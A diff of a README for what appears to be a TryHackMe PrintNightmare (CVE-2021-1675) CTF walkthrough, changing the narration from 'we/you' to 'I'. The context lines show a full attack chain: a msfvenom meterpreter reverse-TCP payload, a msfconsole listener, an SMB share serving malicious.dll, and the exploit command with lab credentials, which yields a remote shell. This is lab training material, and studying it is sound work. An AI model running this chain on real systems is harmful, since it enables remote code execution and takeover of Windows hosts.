@@ -42,7 +42,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -
 
 <br>
 <br>
-4. With msfvenom you need to set up meterpreter session on msfconsole using the same payload you used with msfvenom
+4. With msfvenom I need to set up meterpreter session on msfconsole using the same payload you used with msfvenom
 
 ```
 msfconsole
@@ -56,7 +56,7 @@ run -j
 
 <br>
 <br>
-5. To host the payload, we use smbserver (a tool from impacket). This is the local folder that will share the malicious.dll. <i> *Make sure to run file share with smb2support to ensure compatibility and effectiveness* </i>
+5. To host the payload, I use smbserver (a tool from impacket). This is the local folder that will share the malicious.dll. <i> *Make sure to run file share with smb2support to ensure compatibility and effectiveness* </i>
 
 ```
 smbserver.py share /root/Desktop/share/ -smb2support
@@ -65,7 +65,7 @@ smbserver.py share /root/Desktop/share/ -smb2support
 
 <br>
 <br>
-6. Now, everything is set up, you are ready to run the malicious script. Remember that this is a post-compromise attack, so we have domain controller and domain name, and we have username and password. And then we also have the path to the share file.
+6. Now, everything is set up, I am ready to run the malicious script. Remember that this is a post-compromise attack, so I have domain controller and domain name, and I already have username and password. And then I also have the path to the share file.
 
 ```
 python3.9 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.103.215 '\\10.10.217.212\share\malicious.dll'
@@ -75,13 +75,13 @@ python3.9 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbea
 
 <br>
 <br>
-7. We have a meterpreter shell
+7. I have a meterpreter shell
 <br>
 <img src="https://github.com/trixiahorner/printnightmare-try-hack-me/blob/main/images/pn8.png?raw=true" height="80%" width="80%" alt="meterpretershell"/>
 
 <br>
 <br>
-7. And because this is a tryhackme CTF, we navigate to find the flag
+7. And because this is a tryhackme CTF, I navigate to find the flag
 <br>
 <img src="https://github.com/trixiahorner/printnightmare-try-hack-me/blob/main/images/pn9.png?raw=true" height="80%" width="80%" alt="meterpretershell"/> <br/>
 <br />
